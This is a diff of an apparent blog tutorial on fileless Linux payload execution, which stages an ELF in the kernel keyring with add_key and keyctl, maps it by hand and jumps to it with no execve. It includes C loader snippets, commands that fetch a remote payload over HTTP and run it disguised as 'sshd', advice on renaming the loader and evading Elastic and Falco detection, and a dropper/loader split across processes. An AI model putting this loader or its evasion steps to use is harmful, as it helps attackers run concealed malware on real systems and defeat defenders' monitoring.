@@ -15,11 +15,11 @@ images:
 
 ![imgur](https://i.imgur.com/VHYFmWT.png)
 
-Hello guys! So I wanted to show a technique for executing an ELF payload without ever touching the filesystem and without calling execve. The trick is the Linux kernel keyring, and it's a bit different from what most people do for fileless execution, so lets go.
+Hello guys! So I wanted to show a technique for executing an ELF payload without ever touching the filesystem and without calling execve, the userland exec part is not new, the trick is using the Linux kernel keyring for staging, which is a bit different from what most people do for fileless execution, so lets go.
 
-The issue with the usual approaches like `memfd_create` or `O_TMPFILE` is that even though there's no directory entry, you still end up with a file descriptor sitting in `/proc/self/fd/` and an inode somewhere on a real filesystem. What if we skip all that? That's where the keyring comes in.
+The issue with the usual approaches like `memfd_create` or `O_TMPFILE` is that even though there's no directory entry, you still end up with a file descriptor sitting in `/proc/self/fd/` and an inode somewhere on a real filesystem. The keyring skips both.
 
-Linux has had a key management subsystem since 2.6, and you've probably seen `/proc/keys` at some point without thinking much about it. PAM uses it, Kerberos credential caches use it, dm-crypt uses it. The idea is that processes and sessions can store arbitrary blobs in kernel memory, and the two syscalls we care about are `add_key` (248 on x86-64) and `keyctl` (250).
+Linux has had a key management subsystem since 2.6, and you've probably seen `/proc/keys` at some point without thinking much about it. PAM uses it, Kerberos credential caches use it, dm-crypt uses it. Processes and sessions can store arbitrary blobs in kernel memory through it, and the two syscalls we care about are `add_key` (248 on x86-64) and `keyctl` (250).
 
 We start by storing the ELF:
 
@@ -32,13 +32,13 @@ long key = syscall(248 /* SYS_add_key */,
                    (long)KEY_SPEC_SESSION_KEYRING);
 ```
 
-There's a fair bit going on here, so let's break it down. `syscall(248, ...)` is `add_key`, which takes five arguments. The first is the key type, `"user"`, which is the generic type for arbitrary byte blobs. The second is a description string, `"_dntry"` in our case, which is just a label you pick to identify the key later. Then comes the payload pointer and its size. The last argument, `KEY_SPEC_SESSION_KEYRING` (-3), tells the kernel to attach the key to the current session keyring.
+`syscall(248, ...)` is `add_key`, which takes five arguments. The first is the key type, `"user"`, the generic type for arbitrary byte blobs. The second is a description string, `"_dntry"` here, just a label you pick to find the key later. Then the payload pointer and its size. The last argument, `KEY_SPEC_SESSION_KEYRING` (-3), tells the kernel to attach the key to the current session keyring.
 
-What comes back is a `key_serial_t`, which is just an int32 identifying the key, not a file descriptor, so nothing shows up in `/proc/self/fd/`. The actual payload bytes get stored via `kmemdup()` into slab memory in `security/keys/user_defined.c`, no filesystem involved.
+`add_key` returns a `key_serial_t`, an int32 identifying the key, not a file descriptor, so nothing shows up in `/proc/self/fd/`. The actual payload bytes get stored via `kmemdup()` into slab memory in `security/keys/user_defined.c`, no filesystem involved.
 
-The default per-user quota is 20000 bytes across all keys combined, which is plenty for small payloads, and the technique works fine without root. Root has its own separate quota of 25 MB via `/proc/sys/kernel/keys/root_maxbytes`, so if your payload is larger that's the path.
+The default per-user quota is 20000 bytes across all keys combined, which is plenty for small payloads, and the technique works fine without root. Root has its own separate quota of 25 MB via `/proc/sys/kernel/keys/root_maxbytes`. For larger ELFs, the `big_key` type supports up to 1 MB by staging in an anonymous tmpfs encrypted with ChaCha20-Poly1305, but it requires `CONFIG_BIG_KEYS=y` in the kernel config (enabled by default on Ubuntu Server and RHEL 8/9, not on all distros).
 
-Now, we get the bytes back. `keyctl(KEYCTL_READ)` copies the key payload into a userspace buffer, and you call it twice: once with a null buffer to find out how big the payload is, then again with the actual allocation:
+`keyctl(KEYCTL_READ)` copies the key payload into a userspace buffer, and you call it twice, once with a null buffer to get the size, then again with the actual allocation:
 
 ```c
 long sz = syscall(250 /* SYS_keyctl */,
@@ -62,7 +62,7 @@ syscall(250, (long)KEYCTL_REVOKE, key, 0L, 0L);
 
 `KEYCTL_REVOKE` is operation 3. Once that returns, any further `keyctl(READ)` on that serial gives back `EKEYREVOKED` and the slab gets freed when the reference count hits zero, so from here on the payload only exists in that anonymous mapping.
 
-Now we need to actually run it. We can't use `execve` or `execveat` because there's no fd and no path to give them. So we load the ELF manually and we walk the program headers, find the `PT_LOAD` segments, and map each one into anonymous memory at the right address:
+Running it is the next problem. There's no fd and no path, so `execve` and `execveat` are out. Reading from the keyring into a `memfd` for `execveat` would put an fd back in `/proc/self/fd/`, defeating the whole premise. So we load the ELF manually and we walk the program headers, find the `PT_LOAD` segments, and map each one into anonymous memory at the right address:
 
 ```c
 void *seg = mmap((void *)seg_va, seg_len,
@@ -73,7 +73,7 @@ memcpy((void *)dst, buf + ph[i].p_offset, ph[i].p_filesz);
 mprotect((void *)seg_va, seg_len, prot);
 ```
 
-`MAP_FIXED_NOREPLACE` is important here: without it, if something's already mapped at that address, `mmap` silently stomps on it. With it you get an error instead, which you can actually handle.
+Without `MAP_FIXED_NOREPLACE`, if something's already mapped at that address, `mmap` silently stomps on it. With it, `mmap` fails instead.
 
 Each segment has `p_filesz` bytes of actual content and potentially a larger `p_memsz`, the difference being BSS. Since we mapped with `MAP_ANONYMOUS`, the kernel already zeroed the entire region before our `memcpy`, so the BSS is already handled. The explicit memset here is defensive:
 
@@ -96,7 +96,7 @@ __asm__ volatile(
 );
 ```
 
-We need to zero `rdx` specifically because glibc's `_start` treats it as `rtld_fini` and registers it as an atexit handler if it's nonzero. With whatever garbage was in `rdx` before the jump, that's a crash on exit.
+`rdx` has to be zero because glibc's `_start` treats it as `rtld_fini` and registers it as an atexit handler if it's nonzero. Whatever garbage was in `rdx` before the jump means a crash on exit.
 
 Before jumping, the loader reads its own path and unlinks itself:
 
@@ -108,9 +108,9 @@ if (n > 0) unlink(self_path);
 
 `readlink("/proc/self/exe")` gives back the real filesystem path the binary was loaded from. That's what gets unlinked. The `/proc/self/exe` symlink itself lives in procfs and you can't unlink it directly, but the actual file it points to is fair game. The file disappears from the directory right away, the inode sticks around until the loader exits since the kernel keeps it alive while there's a mapping open.
 
-One bad thing for us is that `/proc/self/exe` ends up showing `(deleted)` while the payload runs, and that suffix is a well-known detection signal since Elastic, Falco, etc actively match on `process.executable` ending in `(deleted)`, so skipping the unlink is actually the better call for stealth. The loader binary stays on disk as a forensic artifact but the running process looks clean, and if you rename the loader to something convincing before running it there is nothing anomalous in the process tree at all.
+One bad thing for us is that `/proc/self/exe` ends up showing `(deleted)` while the payload runs, and that suffix is a well-known detection signal since Elastic, Falco, etc actively match on `process.executable` ending in `(deleted)`, so skipping the unlink is the safer choice for stealth. The loader binary stays on disk as a forensic artifact but the running process looks clean, and if you rename the loader to something convincing before running it there is nothing anomalous in the process tree at all.
 
-Running this under strace confirms the full chain. The payload is hosted remotely, the loader fetches it over HTTPS and never writes it anywhere:
+Under strace, the payload is fetched over HTTP (or HTTPS if built with `-DUSE_HTTPS`) and never written anywhere:
 
 ```bash
 strace -e trace=add_key,keyctl,mmap,mprotect,execve,execveat,unlink ./dntry khttp https://temp.sh/aBcDe/payload sshd
@@ -118,7 +118,7 @@ strace -e trace=add_key,keyctl,mmap,mprotect,execve,execveat,unlink ./dntry khtt
 
 ![strace output](/img/keyring-strace.png)
 
-Three `keyctl` calls total: the size probe, the actual read, then the revoke. Since there's no exec call, the payload never produces a process start event.
+Three `keyctl` calls (plus the `add_key`): the size probe, the actual read, then the revoke. Since there's no exec call, the payload never produces a process start event.
 
 To verify that `/proc/<pid>/fd` is clean while the payload is running, use a demo payload that sleeps. Host it on your server and run:
 
@@ -150,9 +150,28 @@ The third argument becomes `argv[0]` for the payload and what `prctl(PR_SET_NAME
 
 ![payload running](/img/keyring-demo.png)
 
-That's the full chain. The payload goes from HTTP into kernel slab memory, gets copied into an anonymous mapping, and runs via a direct jump with no execve, no fd, no inode anywhere in the VFS. The only artifact that ever existed on disk was the loader itself.
+That demo runs everything in one process. The more interesting use case is cross-process staging: `KEY_SPEC_SESSION_KEYRING` is inherited across `fork()` and `exec()` within the same PAM session. A dropper writes the payload and exits. A separate loader process reads it later with no shared memory, no sockets, no files between them. The `stage` and `load` modes in the repo demonstrate this directly:
 
-The keyring is one of those kernel subsystems that nobody thinks about for this kind of thing, which is part of what makes it interesting.
+```bash
+# process A: dropper - stores ELF in session keyring and exits
+KEY=$(./dntry stage payload.elf)
+
+# key survives in kernel slab after process A is dead:
+# 23214cfe I--Q---  user  _dntry: 9808
+
+# process B: completely separate loader reads from slab and executes
+./dntry load $KEY sshd
+```
+
+![stage and load demo](/img/keyring-stage-load.png)
+
+Process B calls `keyctl(KEYCTL_READ, key_id)` to pull the payload out of the session keyring and into an anonymous mapping, then executes it. The two processes don't share a mapping or otherwise depend on each other. After A exits, the payload stays in the keyring until B reads it back. Between those two, the payload is only in kernel slab memory, with no user VA.
+
+A plain `mmap` can't do this. An anonymous mapping dies with the process that created it, but a `KEY_SPEC_SESSION_KEYRING` entry outlives its creator.
+
+In the khttp/kfile flow, dntry pulls the payload into a temporary userspace buffer, passes it to `add_key()`, and frees the buffer. From there until `KEYCTL_READ`, the payload is in kernel slab with no user VA. `bpf_probe_read_user()` and `ptrace(PEEKDATA)` read from userspace VAs, so neither has anything to read during that window. Once B calls `KEYCTL_READ`, the payload gets copied into an anonymous mapping and the key is revoked. No fd, no inode, the payload never touches the VFS. The loader is the only thing that existed on disk.
+
+The keyring works well here because it's a kernel subsystem that isn't normally thought of as a way to pass data between unrelated processes.
 
 ---
 
